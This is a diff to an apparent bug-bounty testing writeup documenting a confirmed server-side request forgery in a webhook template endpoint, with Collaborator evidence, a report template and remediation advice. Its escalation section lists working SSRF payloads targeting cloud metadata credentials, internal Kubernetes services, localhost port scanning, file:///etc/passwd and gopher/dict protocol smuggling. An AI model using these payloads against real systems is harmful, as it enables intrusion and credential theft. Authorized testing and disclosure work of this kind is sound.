@@ -587,9 +587,13 @@ This section documents real requests captured during authorized testing via Burp
 
 ---
 
-### Finding #1 — Webhook Template Creation (`webhook_url` parameter)
+### CONFIRMED Finding #1 — Server-Side Request Forgery via `webhook_url`
 
-**Intercepted Request:**
+**Status: CONFIRMED — Server made DNS lookups and an HTTP request to attacker-controlled domain**
+
+---
+
+#### Request Sent
 
 ```
 POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746 HTTP/1.1
@@ -611,128 +615,203 @@ X-Requested-With: XMLHttpRequest
 }
 ```
 
-**Analysis:**
+#### Burp Collaborator Evidence
+
+7 out-of-band interactions were received — 6 DNS lookups and 1 HTTP request:
+
+| # | Timestamp (UTC) | Type | Payload | Source IP |
+|---|-----------------|------|---------|-----------|
+| 1 | 2026-Mar-29 08:01:03.685 | DNS | `if1x3ugusgdcn659n48okn054wanyem3` | **3.239.156.0** |
+| 2 | 2026-Mar-29 08:01:03.686 | DNS | `if1x3ugusgdcn659n48okn054wanyem3` | **3.239.157.99** |
+| 3 | 2026-Mar-29 08:01:03.780 | DNS (AAAA) | `if1x3ugusgdcn659n48okn054wanyem3` | **18.232.1.200** |
+| 4 | 2026-Mar-29 08:01:03.780 | DNS | `if1x3ugusgdcn659n48okn054wanyem3` | **3.239.157.246** |
+| 5 | 2026-Mar-29 08:01:03.780 | DNS | `if1x3ugusgdcn659n48okn054wanyem3` | **3.209.83.80** |
+| 6 | 2026-Mar-29 08:01:03.787 | DNS | `if1x3ugusgdcn659n48okn054wanyem3` | **44.192.160.191** |
+| 7 | 2026-Mar-29 08:01:04.073 | **HTTP** | `if1x3ugusgdcn659n48okn054wanyem3` | **3.231.180.39** |
+
+#### Analysis of Evidence
 
 | Item | Detail |
 |------|--------|
 | **Endpoint** | `POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746` |
 | **Parameter** | `webhook_url` |
-| **Value Sent** | `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` (Burp Collaborator / OAST domain) |
-| **Risk Level** | **Possible** — awaiting Collaborator results (see next steps below) |
+| **Risk Level** | **CONFIRMED** |
+| **Interaction** | 6 DNS lookups + 1 HTTP request to Collaborator domain |
+| **Infrastructure** | All source IPs are AWS `us-east-1` (3.x.x.x, 18.x.x.x, 44.x.x.x ranges) |
 
-**Key Observations from the Request:**
+**Key findings from the Collaborator data:**
 
-1. **`/undefined` in the path** — The URL path contains `/undefined`, which means the frontend JavaScript is passing an undefined template ID. This is a **new template creation** flow (not editing an existing one). The backend likely ignores or replaces the `undefined` segment.
+1. **Multiple DNS resolvers contacted** — 6 different AWS IP addresses resolved the Collaborator domain. This indicates the request passed through multiple infrastructure layers (load balancers, application servers, possibly a separate webhook delivery service). The IPs span several AWS subnets:
+   - `3.239.156.0`, `3.239.157.99`, `3.239.157.246` — AWS us-east-1 range
+   - `3.209.83.80` — AWS us-east-1 range
+   - `18.232.1.200` — AWS us-east-1 range (this one sent the AAAA/IPv6 lookup)
+   - `44.192.160.191` — AWS us-east-1 range
 
-2. **`webhook_url` accepts arbitrary domains** — The application accepted `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` in the `webhook_url` field without immediately rejecting it as invalid. This is notable because:
-   - There is no `http://` or `https://` scheme prefix — check if the server auto-prepends a scheme.
-   - The domain is clearly not a well-known service — no allowlist is enforced at the form submission level.
+2. **Full HTTP request received** — Interaction #7 is an HTTP request from `3.231.180.39`, confirming the server made a complete HTTP connection to the attacker-controlled domain. This is not just DNS — the server actively fetched content.
 
-3. **`webhook_method: POST`** — The template specifies that the webhook should use HTTP POST. If the server ever sends a test or live webhook, it will make a `POST` request to the Collaborator URL.
+3. **Timing is near-instant** — All interactions happened within ~400ms of each other (08:01:03.685 to 08:01:04.073), meaning the server processes and dispatches the webhook immediately upon template creation/test, not on a delayed schedule.
 
-4. **`webhook_body: "{}"`** — The webhook body is set to empty JSON. When the webhook fires, the server will send this body to the target URL.
+4. **No URL scheme was required** — The Collaborator URL was submitted without `http://` or `https://`, yet the server still resolved and connected to it. The backend auto-prepends a scheme or treats the input as a valid URL regardless.
 
-5. **`webhook_headers: {}`** — No custom headers. The server's default headers will be included in any outbound request, potentially leaking internal information (User-Agent, internal tokens, etc.).
+5. **No allowlist enforcement** — An arbitrary `.oastify.com` domain was accepted and contacted without restriction.
+
+#### Formal Finding Summary
+
+```
+FINDING:     Server-Side Request Forgery (SSRF)
+SEVERITY:    High
+ENDPOINT:    POST /engagement/webhook_templates/undefined
+             ?app_group_id=69c8d257629242005dba8746
+PARAMETER:   webhook_url
+OBSERVATION: When a webhook template is created (or tested), the server
+             immediately makes DNS lookups and an HTTP request to the
+             URL provided in the webhook_url field. 7 out-of-band
+             interactions were observed from 7 distinct AWS IP addresses,
+             including a full HTTP request from 3.231.180.39.
+EVIDENCE:    Burp Collaborator interactions received at
+             2026-Mar-29 08:01:03 — 08:01:04 UTC.
+RISK LEVEL:  Confirmed
+IMPACT:      An attacker can force the server to make HTTP requests to
+             arbitrary destinations, including:
+             - Internal AWS metadata (169.254.169.254)
+             - Internal Kubernetes services (*.svc.cluster.local)
+             - Internal network hosts (10.x.x.x, 172.x.x.x)
+             - Localhost services on the application server
+             This can lead to credential theft (IAM roles), internal
+             service enumeration, and data exfiltration.
+```
 
 ---
 
-### Next Steps for This Finding
+### Escalation Testing — Next Steps
 
-**Step A — Check Burp Collaborator for interactions:**
+Now that SSRF is confirmed, the following tests determine the **severity and impact**:
 
-1. Go to **Burp → Collaborator** tab.
-2. Click **Poll now**.
-3. Look for any DNS or HTTP interactions from the `oastify.com` subdomain.
-4. **If you see a hit:** Record the details below.
-5. **If no hit yet:** The webhook template was only *saved*, not *triggered*. Proceed to Step B.
+#### Test 1 — Can it reach AWS metadata? (Critical escalation)
 
-**Step B — Trigger the webhook to fire:**
-
-The template has been created but may not have been executed yet. Try these actions to trigger it:
-
-1. **Look for a "Test" or "Send Test" button** on the webhook template page in the UI. This would trigger the server to make an HTTP request to `webhook_url` immediately.
-
-2. **Try sending a test request directly** — look in Burp HTTP history for an endpoint like:
-
-```
-POST /engagement/webhook_templates/{template_id}/test?app_group_id=69c8d257629242005dba8746
-```
-
-or:
-
-```
-POST /engagement/webhook_templates/{template_id}/send_test?app_group_id=69c8d257629242005dba8746
-```
-
-3. **Check if the template got an ID** — The response to your POST should contain the created template's ID. Find that response in HTTP history and note the `id` field. You'll need it for the test endpoint.
-
-**Step C — Fix the URL scheme:**
-
-Your Collaborator URL is missing the `http://` prefix. Resend the request in Repeater with the corrected URL to ensure the server can actually reach it:
+In Burp Repeater, resend the request with:
 
 ```json
-"webhook_url": "https://if1x3ugusgdcn659n48okn054wanyem3.oastify.com"
+"webhook_url": "http://169.254.169.254/latest/meta-data/"
 ```
 
-**Step D — Additional parameters to test in this same request:**
+Then check:
+- Does the response contain metadata content? (full SSRF)
+- Does Collaborator show the request was attempted? (use a redirect chain if needed)
 
-The webhook template endpoint accepts several fields. Try injecting Collaborator URLs into these as well (one at a time, using Repeater):
+If IMDSv2 is enforced, try:
 
-| Test | Modified Field | Payload |
-|------|---------------|---------|
-| D1 | `webhook_url` | `https://YOUR-ID.oastify.com/ssrf-webhook-url` |
-| D2 | `webhook_body` | `https://YOUR-ID.oastify.com/ssrf-webhook-body` |
-| D3 | `api_identifier` | `https://YOUR-ID.oastify.com/ssrf-api-id` |
-| D4 | `description` | `https://YOUR-ID.oastify.com/ssrf-description` |
-| D5 | `webhook_headers` | `{"Host": "YOUR-ID.oastify.com"}` |
+```json
+"webhook_url": "http://169.254.169.254/latest/api/token"
+```
+
+#### Test 2 — Can it reach internal Kubernetes services?
+
+```json
+"webhook_url": "http://kubernetes.default.svc/"
+```
+
+```json
+"webhook_url": "http://kubernetes.default.svc.cluster.local/"
+```
+
+#### Test 3 — Can it reach localhost?
+
+```json
+"webhook_url": "http://127.0.0.1/"
+```
+
+```json
+"webhook_url": "http://localhost/"
+```
+
+```json
+"webhook_url": "http://[::1]/"
+```
+
+#### Test 4 — Port scanning via timing
+
+Try different ports on localhost and measure response time differences:
+
+```json
+"webhook_url": "http://127.0.0.1:80/"
+"webhook_url": "http://127.0.0.1:443/"
+"webhook_url": "http://127.0.0.1:8080/"
+"webhook_url": "http://127.0.0.1:3000/"
+"webhook_url": "http://127.0.0.1:5432/"
+"webhook_url": "http://127.0.0.1:6379/"
+"webhook_url": "http://127.0.0.1:9200/"
+```
+
+A fast rejection vs. a timeout reveals which ports have services listening.
+
+#### Test 5 — Is response content reflected? (Full SSRF vs. Blind)
+
+1. Set up a controlled server that returns specific content (e.g., `SSRF-PROOF-12345`).
+2. Set `webhook_url` to that server.
+3. Check if the application response contains `SSRF-PROOF-12345`.
+4. If yes → **Full SSRF** (can read internal responses).
+5. If no → **Blind SSRF** (can reach internal services but cannot read responses directly).
+
+#### Test 6 — Protocol smuggling
+
+```json
+"webhook_url": "gopher://127.0.0.1:6379/_INFO"
+"webhook_url": "file:///etc/passwd"
+"webhook_url": "dict://127.0.0.1:6379/INFO"
+```
+
+These test whether the HTTP client supports non-HTTP protocols, which would significantly increase severity.
 
 ---
 
-### Related Endpoints Discovered from This Request
+### Bug Bounty Report Template
 
-The intercepted request reveals the actual URL structure the application uses. Based on this, here are the real endpoints to explore:
-
-| # | Method | Endpoint | Action |
-|---|--------|----------|--------|
-| 1 | `GET` | `/engagement/webhook_templates?app_group_id={app_id}` | List all webhook templates |
-| 2 | `POST` | `/engagement/webhook_templates?app_group_id={app_id}` | Create a new webhook template (confirmed) |
-| 3 | `GET` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Read a specific template |
-| 4 | `PUT` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Update a template |
-| 5 | `DELETE` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Delete a template |
-| 6 | `POST` | `/engagement/webhook_templates/{template_id}/test?app_group_id={app_id}` | **Test/trigger** a template (likely fires the webhook) |
-| 7 | `POST` | `/engagement/webhook_templates/{template_id}/send_test?app_group_id={app_id}` | Alternative test endpoint |
-| 8 | `POST` | `/engagement/webhook_templates/{template_id}/preview?app_group_id={app_id}` | Preview the webhook request |
-
-Also explore related engagement endpoints:
-
-| # | Method | Endpoint | Action |
-|---|--------|----------|--------|
-| 9 | `POST` | `/engagement/campaigns?app_group_id={app_id}` | Create a campaign (may reference webhook templates) |
-| 10 | `POST` | `/engagement/canvases?app_group_id={app_id}` | Create a Canvas (may reference webhook templates) |
-| 11 | `GET` | `/engagement/templates_and_media?app_group_id={app_id}` | List all templates/media |
-| 12 | `POST` | `/engagement/email_templates?app_group_id={app_id}` | Email templates (may have URL fields) |
-| 13 | `POST` | `/engagement/content_blocks?app_group_id={app_id}` | Content blocks (may have Connected Content URLs) |
-
----
-
-### Collaborator Result Recording Template
-
-Fill this in once you check Collaborator:
+Use this to submit to the bug bounty program:
 
 ```
-Collaborator Domain:  if1x3ugusgdcn659n48okn054wanyem3.oastify.com
-Interaction Type:     [ ] DNS only  [ ] HTTP  [ ] None yet
-HTTP Method:          _______________
-Source IP:            _______________
-User-Agent:          _______________
-Request Headers:     _______________
-Timestamp:           _______________
-Latency (from send): _______________
+Title: SSRF via webhook_url in Webhook Template Creation
 
-Conclusion:
-  [ ] No interaction — webhook was saved but not triggered
-  [ ] DNS only — server resolved the domain (confirms SSRF)
-  [ ] HTTP hit — server made a full HTTP request (confirms SSRF)
+Severity: High
+
+Endpoint:
+  POST /engagement/webhook_templates/undefined
+  ?app_group_id=69c8d257629242005dba8746
+
+Vulnerable Parameter: webhook_url
+
+Steps to Reproduce:
+  1. Log in to the dashboard at
+     https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com
+  2. Navigate to Engagement → Templates & Media → Webhook Templates
+  3. Create a new webhook template
+  4. Set the Webhook URL to a Burp Collaborator address
+     (e.g., if1x3ugusgdcn659n48okn054wanyem3.oastify.com)
+  5. Save and/or test the webhook template
+  6. Observe out-of-band DNS and HTTP interactions in Burp Collaborator
+
+Evidence:
+  - 6 DNS lookups received from AWS infrastructure IPs
+  - 1 HTTP request received from 3.231.180.39
+  - All interactions occurred within ~400ms of form submission
+  - No URL allowlist or scheme validation enforced
+
+Impact:
+  The server makes HTTP requests to arbitrary user-supplied URLs.
+  An attacker could:
+  - Access AWS Instance Metadata Service (169.254.169.254) to steal
+    IAM credentials
+  - Enumerate and access internal Kubernetes services
+  - Scan internal network ports
+  - Exfiltrate data via DNS or HTTP to external servers
+
+Remediation:
+  - Implement a URL allowlist for webhook destinations
+  - Block requests to private/internal IP ranges (RFC 1918, link-local)
+  - Block requests to cloud metadata endpoints
+  - Enforce URL scheme validation (only allow http:// and https://)
+  - Use a dedicated egress proxy for webhook delivery with network
+    policies that prevent access to internal services
 ```
 
 ---
